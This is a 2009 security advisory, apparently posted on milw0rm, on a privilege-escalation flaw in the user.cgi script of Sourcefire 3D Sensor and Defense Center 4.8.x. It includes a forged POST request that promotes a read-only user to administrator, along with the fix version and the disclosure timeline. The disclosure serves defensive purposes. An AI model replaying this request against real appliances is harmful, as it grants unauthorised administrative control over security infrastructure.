@@ -1,0 +1,58 @@
+Affected product
+----------------
+
+Sourcefire 3D Sensor and Defense Center 4.8.x
+ 
+Tested on 4.8.0.3 and 4.8.0.4, 3D Sensor 2500 & DC 1000
+All 4.8.x releases, up to and including 4.8.1, confirmed vulnerable by sourcefire.
+
+
+Vulnerability details
+---------------------
+
+A privilege escalation vulnerability found in the Sensor and the DC web based management interfaces allows any local account
+to take over the appliances administrator role.
+While the "user.cgi" PERL script correctly validates that incoming requests belong to an authenticated session, in such a case 
+it also blindly grants read/write access to all accounts configuration with no regard for the role of the request's originator. 
+Therefore a user with even the lowest level of access (ie. without any role configured) is able to promote himself as administrator 
+and/or change others roles and account parameters at will. 
+Depending of the role or roles initially configured for this user, access to the user management page may not be visible
+into the interface's layout however the underlying script itself is still reachable and can be invoked "by hand".
+
+Let's now consider a malicious operator named 'foobar' whose role has been restricted to "Event analyst (read only)".
+He would first log in to the appliance using his own credentials in order to get an authenticated session cookie (CGISESSID=xxxxxxxxxxxxxxxxxx)
+then he could send a forged POST request similar to the one below:
+ 
+POST https://x.x.x.x/admin/user/user.cgi HTTP/1.1
+User-Agent: xxxxxx
+Keep-Alive: 300
+Connection: Keep-alive
+Cookie: CGISESSID=xxxxxxxxxxxxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+Content-length: 56
+
+mode=edit&username=foobar&admin=%24admin&action_add=Save
+
+He would thereafter be promoted to administrator by the appliance with full access into the management interface.
+ 
+As a final note, several other scripts were reported being affected by the same vulnerability after investigation from the vendor.
+
+
+Resolution
+----------
+
+Upgrade your appliance's software to 4.8.2 available from the Sourcefire's support website located at https://support.sourcefire.com/
+
+
+Disclosure timeline
+-------------------
+
+2009-05-05: Vulnerability discovered and reported to Sourcefire.
+2009-06-30: 4.8.2 released by Sourcefire.
+2009-07-01: Public disclosure.
+
+
+
+Gregory Duchemin
+
+# milw0rm.com [2009-07-02]
